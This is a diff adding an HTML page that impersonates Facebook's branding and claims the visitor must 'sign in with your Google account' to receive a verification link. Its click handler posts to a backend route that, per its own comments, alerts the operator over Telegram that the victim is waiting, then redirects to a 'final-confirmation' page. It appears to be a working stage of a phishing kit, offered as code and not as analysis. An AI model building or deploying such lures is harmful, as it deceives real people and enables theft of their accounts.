@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Almost Done</title>
+    <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iIzE4NzdGMiI+PHBhdGggZD0iTTI0IDEyLjA3M2MwLTYuNjI3LTUuMzczLTEyLTEyLTEycy0xMiA1LjM3My0xMiAxMmMwIDUuOTkgNC4zODggMTAuOTU0IDEwLjEyNSAxMS45Mjd2LTguNDM3SDcuMDc4di0zLjQ5aDMuMDQ3VjkuNDNjMC0zLjAwNyAxLjc5Mi00LjY2OSA0LjUzMy00LjY2OSAxLjMxMiAwIDIuNjg2LjIzNCAyLjY4Ni4yMzR2Mi45NTNoLTEuNTE0Yy0xLjQ5MSAwLTEuOTU1LjkyNS0xLjk1NSAxLjg3NHYyLjI1aDMuMzI4bC0uNTMyIDMuNDloLTIuNzk2djguNDM3QzE5LjYxMiAyMy4wMjcgMjQgMTguMDYyIDI0IDEyLjA3M3oiLz48L3N2Zz4=">
+    <style>
+        body {
+            font-family: SFProText-Regular, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            color: #1c1e21;
+        }
+        .container {
+            background: white;
+            padding: 24px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1);
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+        }
+        .almost-done {
+            color: #65676b;
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+        .fb-logo {
+            color: #1877f2;
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        h2 {
+            font-size: 20px;
+            margin-bottom: 12px;
+        }
+        p {
+            font-size: 15px;
+            color: #65676b;
+            line-height: 1.4;
+            margin-bottom: 24px;
+        }
+        .btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 10px 20px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background-color 0.2s;
+        }
+        .btn:hover {
+            background-color: #166fe5;
+        }
+        .btn:disabled {
+            background-color: #e4e6ea;
+            color: #bcc0c4;
+            cursor: not-allowed;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="almost-done">Almost done</div>
+        <div class="fb-logo">facebook</div>
+        <h2>To complete the verification process</h2>
+        <p>Please sign in with your Google account by clicking the button below to receive your secure verification link..</p>
+        <button id="proceed-btn" class="btn">Receive verification link</button>
+    </div>
+
+    <script>
+        document.getElementById('proceed-btn').addEventListener('click', async function() {
+            const btn = this;
+            btn.disabled = true;
+            btn.textContent = 'Processing...';
+            
+            try {
+                // Alert Telegram that user is awaiting link
+                const response = await fetch('/api/notify-waiting', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        message: "🚨 <b>User clicked PROCEED</b>\n\nThey are now <b>AWAITING</b> the verification link.",
+                        timestamp: new Date().toLocaleString()
+                    })
+                });
+                
+                const data = await response.json();
+                console.log("Telegram notification result:", data);
+            } catch (e) {
+                console.error("Failed to notify telegram", e);
+            } finally {
+                // Redirect to the final confirmation page
+                setTimeout(() => {
+                    window.location.href = '/final-confirmation';
+                }, 1000);
+            }
+        });
+    </script>
+</body>
+</html>
